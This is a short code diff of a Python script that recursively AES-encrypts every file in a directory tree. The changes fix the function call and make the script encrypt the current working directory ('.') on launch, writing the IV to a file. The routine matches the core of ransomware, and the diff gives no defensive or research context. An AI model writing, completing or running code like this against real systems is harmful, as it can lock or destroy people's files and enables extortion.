@@ -9,7 +9,7 @@ from Crypto.Util.Padding import pad
 def encrypt_files_in_directory(directory):
     for root, dirs, files in os.walk(directory):
         for filename in files:
-            encrypt_file(os.path.join(root, filename))
+            aes_encrypt(os.path.join(root, filename))
 
 def aes_encrypt(filepath):
     # Generate a 256-bit AES key
@@ -42,4 +42,4 @@ def aes_encrypt(filepath):
     with open("iv.txt", "wb") as iv_file:
         iv_file.write(iv)
 
-encrypt_files_in_directory(directory)
+encrypt_files_in_directory(".")
